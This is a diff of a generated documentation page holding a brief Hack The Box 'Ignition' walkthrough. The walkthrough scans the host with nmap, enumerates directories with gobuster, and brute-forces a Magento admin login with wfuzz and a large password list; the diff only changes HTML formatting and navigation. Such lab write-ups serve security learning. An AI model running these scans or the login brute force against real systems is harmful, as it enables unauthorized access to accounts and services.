@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -16938,34 +16961,46 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 
 
 <h1 id="ignition-a-hack-the-box-machine">Ignition, a Hack The Box Machine</h1>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-Pn
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-Pn
+</span></code></pre></div></td></tr></table></div>
 <p>Adding ignition.htb to /etc/hosts</p>
 <p>Enumerating:
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>dir<span class="w"> </span>-u<span class="w"> </span>http://ignition.htb<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt<span class="w">  </span>-t<span class="w"> </span><span class="m">40</span>
-</span></code></pre></div></p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>dir<span class="w"> </span>-u<span class="w"> </span>http://ignition.htb<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt<span class="w">  </span>-t<span class="w"> </span><span class="m">40</span>
+</span></code></pre></div></td></tr></table></div></p>
 <p>Browsing found files and gathering information:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>/home                 (Status: 200) [Size: 25802]
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>/contact              (Status: 200) [Size: 28673]
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>/media                (Status: 301) [Size: 185] [--&gt; http://ignition.htb/media/]
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>/0                    (Status: 200) [Size: 25803]
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>/static               (Status: 301) [Size: 185] [--&gt; http://ignition.htb/static/]
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>/catalog              (Status: 302) [Size: 0] [--&gt; http://ignition.htb/]
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>/admin                (Status: 200) [Size: 7095]
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>/Home                 (Status: 301) [Size: 0] [--&gt; http://ignition.htb/home]
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>/setup                (Status: 301) [Size: 185] [--&gt; http://ignition.htb/setup/]
-</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>/checkout             (Status: 302) [Size: 0] [--&gt; http://ignition.htb/checkout/cart/]
-</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>/robots               (Status: 200) [Size: 1]
-</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>/wishlist             (Status: 302) [Size: 0] [--&gt; http://ignition.htb/customer/account/login/referer/aHR0cDovL2lnbml0aW9uLmh0Yi93aXNobGlzdA%2C%2C/]    
-</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>/soap                 (Status: 200) [Size: 391]
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-2-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-2-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-2-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-2-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-2-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-2-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-2-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-2-10">10</a></span>
+<span class="normal"><a href="#__codelineno-2-11">11</a></span>
+<span class="normal"><a href="#__codelineno-2-12">12</a></span>
+<span class="normal"><a href="#__codelineno-2-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>/home                 (Status: 200) [Size: 25802]
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>/contact              (Status: 200) [Size: 28673]
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>/media                (Status: 301) [Size: 185] [--&gt; http://ignition.htb/media/]
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>/0                    (Status: 200) [Size: 25803]
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a>/static               (Status: 301) [Size: 185] [--&gt; http://ignition.htb/static/]
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a>/catalog              (Status: 302) [Size: 0] [--&gt; http://ignition.htb/]
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a>/admin                (Status: 200) [Size: 7095]
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a>/Home                 (Status: 301) [Size: 0] [--&gt; http://ignition.htb/home]
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9"></a>/setup                (Status: 301) [Size: 185] [--&gt; http://ignition.htb/setup/]
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10"></a>/checkout             (Status: 302) [Size: 0] [--&gt; http://ignition.htb/checkout/cart/]
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11"></a>/robots               (Status: 200) [Size: 1]
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12"></a>/wishlist             (Status: 302) [Size: 0] [--&gt; http://ignition.htb/customer/account/login/referer/aHR0cDovL2lnbml0aW9uLmh0Yi93aXNobGlzdA%2C%2C/]    
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13"></a>/soap                 (Status: 200) [Size: 391]
+</span></code></pre></div></td></tr></table></div>
 <p>Knowing this we could do a more precise enumeration with:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://ignition.htb<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/SecLists-master/Discovery/Web-Content/CMS/sitemap-magento.txt<span class="w">  </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://ignition.htb<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/SecLists-master/Discovery/Web-Content/CMS/sitemap-magento.txt<span class="w">  </span>
+</span></code></pre></div></td></tr></table></div>
 <p>From /admin we get to a login panel of a Magento application. From /setup we obtain the Magento version: Version dev-2.4-develop.</p>
 <p>Brute forcing it:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>wfuzz<span class="w"> </span>-c<span class="w"> </span>-z<span class="w"> </span>file,/usr/share/wordlists/SecLists-master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;login%5Busername%5D=admin&amp;login%5Bpassword%5D=FUZZ&quot;</span><span class="w"> </span>http://ignition.htb/admin
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>wfuzz<span class="w"> </span>-c<span class="w"> </span>-z<span class="w"> </span>file,/usr/share/wordlists/SecLists-master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;login%5Busername%5D=admin&amp;login%5Bpassword%5D=FUZZ&quot;</span><span class="w"> </span>http://ignition.htb/admin
+</span></code></pre></div></td></tr></table></div>
 <p>Enter in /admin with credentials. Flag is in the dashboard.</p>
 
 <!-- This section adds support for localized revision dates -->
@@ -17042,7 +17077,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
